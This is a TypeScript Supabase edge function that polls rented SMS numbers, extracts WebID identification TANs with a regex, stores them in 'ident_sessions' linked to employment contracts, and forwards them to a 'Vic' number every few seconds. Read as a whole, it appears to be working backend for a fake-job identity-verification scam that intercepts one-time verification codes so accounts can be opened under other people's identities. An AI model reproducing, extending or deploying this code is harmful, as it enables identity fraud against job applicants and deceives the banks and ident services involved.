import { createClient } from "npm:@supabase/supabase-js@2";
import { forwardByPhoneIdentifier } from "../_shared/forwardTan.ts";
import { notifyIncomingSms } from "../_shared/notifyIncomingSms.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};

const SMSBOT_BASE = "https://cabinet.smsbot.cc/api/v1";

const supabase = createClient(
  Deno.env.get("SUPABASE_URL")!,
  Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
  { auth: { persistSession: false } },
);

interface Sms {
  sender: string;
  date: string;
  text: string;
}

function normSms(m: any): Sms {
  const svc = typeof m?.service === "object" ? (m.service?.name ?? null) : (m?.service ?? null);
  return {
    sender: m?.messageSender ?? m?.sender ?? m?.detectedService ?? svc ?? m?.from ?? m?.originator ?? "Unbekannt",
    date: m?.messageDate ?? m?.receivedAt ?? m?.createdAt ?? m?.date ?? new Date().toISOString(),
    text: m?.messageText ?? m?.message ?? m?.text ?? m?.body ?? "",
  };
}

/** Assignment lookup: identifier -> { name, order } */
async function resolveAssignment(identifier: string): Promise<{ name: string | null; order: string | null; brandingId: string | null }> {
  const { data: session } = await supabase
    .from("ident_sessions")
    .select("contract_id, order_id, branding_id, updated_at")
    .eq("phone_api_url", identifier)
    .order("updated_at", { ascending: false })
    .limit(1)
    .maybeSingle();

  if (!session) return { name: null, order: null, brandingId: null };

  let name: string | null = null;
  let order: string | null = null;

  if (session.contract_id) {
    const { data: c } = await supabase
      .from("employment_contracts")
      .select("first_name, last_name")
      .eq("id", session.contract_id)
      .maybeSingle();
    if (c) {
      const full = `${c.first_name ?? ""} ${c.last_name ?? ""}`.trim();
      name = full || null;
    }
  }
  if (session.order_id) {
    const { data: o } = await supabase
      .from("orders")
      .select("title")
      .eq("id", session.order_id)
      .maybeSingle();
    order = (o?.title as string) ?? null;
  }

  return { name, order, brandingId: (session.branding_id as string) ?? null };
}

async function handleMessages(opts: {
  provider: "smsbot" | "anosim";
  sourceKey: string;
  identifier: string;
  number: string;
  brandingId: string | null;
  brandingName: string | null;
  messages: Sms[];
}) {
  const { provider, sourceKey, identifier, number, brandingName, messages } = opts;
  if (messages.length === 0) return 0;

  const assignment = await resolveAssignment(identifier);
  const sent = await notifyIncomingSms({
    provider,
    sourceKey,
    identifier,
    phoneNumber: number,
    brandingId: opts.brandingId ?? assignment.brandingId,
    brandingName,
    messages,
  });

  for (const sms of messages) {

    // WebID TAN extrahieren und nur in AKTIVE ident_sessions speichern
    // (waiting / data_sent). Abgeschlossene/abgebrochene werden ignoriert,
    // damit alte TANs nicht wieder auftauchen.
    const tanMatch = sms.text.match(/WebID\s+Identification\s+TAN\s*\/\s*Code\s*:\s*(\d{6})/i);
    if (tanMatch) {
      const tan = tanMatch[1];
      const { data: sess } = await supabase
        .from("ident_sessions")
        .select("id")
        .eq("phone_api_url", identifier)
        .in("status", ["waiting", "data_sent"])
        .order("updated_at", { ascending: false })
        .limit(1)
        .maybeSingle();
      if (sess?.id) {
        await supabase
          .from("ident_sessions")
          .update({ last_tan: tan, last_tan_at: new Date().toISOString() })
          .eq("id", sess.id);
      }
    }
  }
  // TAN-Weiterleitung an die Vic-Nummer (nur aktive Sessions, idempotent)
  try {
    const result = await forwardByPhoneIdentifier(identifier, messages);
    if (result.checked === 0 && result.reason === "no_active_session") {
      // Sessions may store the other URL form (share vs. api) — try both.
      const alt = identifier.includes("/share/orderbooking?")
        ? identifier.replace("/share/orderbooking?", "/api/v1/orderbookingshare?")
        : identifier.replace("/api/v1/orderbookingshare?", "/share/orderbooking?");
      if (alt !== identifier) {
        await forwardByPhoneIdentifier(alt, messages);
      }
    }
  } catch (e) {
    console.error("forwardByPhoneIdentifier failed:", e);
  }

  return sent;
}


async function pollSmsbot(branding: any, fallbackApiKey: string | null = null): Promise<number> {
  const apiKey = (branding.smsbot_api_key as string | null) ?? fallbackApiKey;
  if (!apiKey) return 0;
  const headers = { Authorization: `Bearer ${apiKey}`, Accept: "application/json" };

  let rentals: any[] = [];
  try {
    const res = await fetch(`${SMSBOT_BASE}/rentals`, { headers });
    if (!res.ok) {
      console.warn(`SMSBot rentals ${res.status} for branding ${branding.id}`);
      return 0;
    }
    const raw = await res.json();
    rentals = Array.isArray(raw) ? raw : (raw?.data ?? raw?.rentals ?? raw?.items ?? []);
  } catch (e) {
    console.warn("SMSBot rentals fetch failed:", String(e));
    return 0;
  }

  const numberByRental: Record<string, string> = {};
  const inlineSms: Record<string, Sms[]> = {};
  for (const r of rentals) {
    const rid = String(r?.id ?? r?.rentalId ?? r?._id ?? "");
    if (!rid) continue;
    numberByRental[rid] = r?.number ?? r?.phoneNumber ?? r?.phone ?? "";
    const arr = r?.sms ?? r?.messages ?? r?.smsMessages ?? [];
    if (Array.isArray(arr) && arr.length) inlineSms[rid] = arr.map(normSms);
  }

  // Global SMS endpoint (contains messages for all rentals)
  const byRental: Record<string, Sms[]> = { ...inlineSms };
  try {
    const res = await fetch(`${SMSBOT_BASE}/sms`, { headers });
    if (res.ok) {
      const raw = await res.json();
      const arr = Array.isArray(raw) ? raw : (raw?.data ?? raw?.sms ?? raw?.items ?? []);
      for (const m of (Array.isArray(arr) ? arr : [])) {
        const rid = String(m?.rentalId ?? m?.rental_id ?? m?.rental?.id ?? "");
        if (!rid) continue;
        (byRental[rid] ??= []).push(normSms(m));
      }
    }
  } catch (e) {
    console.warn("SMSBot sms fetch failed:", String(e));
  }

  let sent = 0;
  for (const [rid, messages] of Object.entries(byRental)) {
    sent += await handleMessages({
      provider: "smsbot",
      sourceKey: `${branding.id ?? "global"}:${rid}`,
      identifier: `smsbot://${rid}`,
      number: numberByRental[rid] ?? "",
      brandingId: branding.id ?? null,
      brandingName: branding.company_name ?? null,
      messages,
    });
  }
  return sent;
}

/** Anosim-Shares, die abgelaufen sind (400) – innerhalb dieses Laufs nicht erneut abfragen. */
const expiredAnosim = new Set<string>();

async function pollAnosim(entry: any, brandingName: string | null): Promise<number> {
  const rawUrl = entry.api_url as string | null;
  if (!rawUrl) return 0;
  if (expiredAnosim.has(entry.id)) return 0;
  const url = rawUrl.replace("/share/orderbooking?", "/api/v1/orderbookingshare?");
  let data: any;
  try {
    const res = await fetch(url);
    if (!res.ok) {
      if (res.status === 400 || res.status === 404) {
        // Share-Token abgelaufen – kein Fehler, nur nicht mehr abfragen
        expiredAnosim.add(entry.id);
      } else {
        console.warn(`Anosim ${res.status} for ${entry.id}`);
      }
      return 0;
    }
    data = await res.json();
  } catch (e) {
    console.warn("Anosim fetch failed:", String(e));
    return 0;
  }


  const messages = Array.isArray(data?.sms) ? data.sms.map(normSms) : [];
  return await handleMessages({
    provider: "anosim",
    sourceKey: url,
    identifier: rawUrl,
    number: data?.number ?? entry.label ?? "",
    brandingId: entry.branding_id ?? null,
    brandingName,
    messages,
  });
}

/** Räumt Einträge älter als 30 Tage auf (max. einmal pro Instanz-Stunde). */
let lastCleanup = 0;
async function cleanupOldSeen(): Promise<void> {
  if (Date.now() - lastCleanup < 60 * 60 * 1000) return;
  lastCleanup = Date.now();
  const cutoff = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString();
  const { error } = await supabase.from("sms_inbox_seen").delete().lt("created_at", cutoff);
  if (error) console.warn("cleanupOldSeen failed:", error.message);
}

async function scanOnce(): Promise<number> {
  await cleanupOldSeen();

  const { data: brandings } = await supabase
    .from("brandings")
    .select("id, company_name, smsbot_api_key");

  const brandingNameById: Record<string, string> = {};
  for (const b of brandings ?? []) brandingNameById[b.id as string] = (b.company_name as string) ?? "";

  let total = 0;

  // SMSBot: one poll per branding with an API key
  for (const b of (brandings ?? []).filter((b: any) => b.smsbot_api_key)) {
    total += await pollSmsbot(b);
  }

  // Legacy/global SMSBot account: poll it once as a fallback. Assignment and
  // branding are resolved from the rental's ident session when notifying.
  const globalSmsbotKey = Deno.env.get("SMSBOT_API_KEY")?.trim() || null;
  if (globalSmsbotKey) {
    const configuredKeys = new Set(
      (brandings ?? [])
        .map((b: any) => String(b.smsbot_api_key ?? "").trim())
        .filter(Boolean),
    );
    if (!configuredKeys.has(globalSmsbotKey)) {
      total += await pollSmsbot({ id: null, company_name: null, smsbot_api_key: null }, globalSmsbotKey);
    }
  }

  // Anosim: one poll per stored number
  const { data: anosimNumbers } = await supabase
    .from("phone_numbers")
    .select("id, api_url, branding_id, label")
    .eq("provider", "anosim");

  for (const entry of anosimNumbers ?? []) {
    total += await pollAnosim(entry, entry.branding_id ? brandingNameById[entry.branding_id as string] ?? null : null);
  }

  return total;
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const body = await req.json().catch(() => ({}));
    // Cron runs once a minute; do several passes so latency stays ~15s.
    const passes = Math.min(Math.max(Number(body?.passes ?? 4), 1), 6);
    const gapMs = Math.min(Math.max(Number(body?.gapMs ?? 15000), 1000), 30000);

    let total = 0;
    for (let i = 0; i < passes; i++) {
      if (i > 0) await new Promise((r) => setTimeout(r, gapMs));
      total += await scanOnce();
    }

    return new Response(JSON.stringify({ ok: true, forwarded: total, passes }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err) {
    console.error("sms-inbox-watch error:", err);
    return new Response(JSON.stringify({ error: String(err) }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});

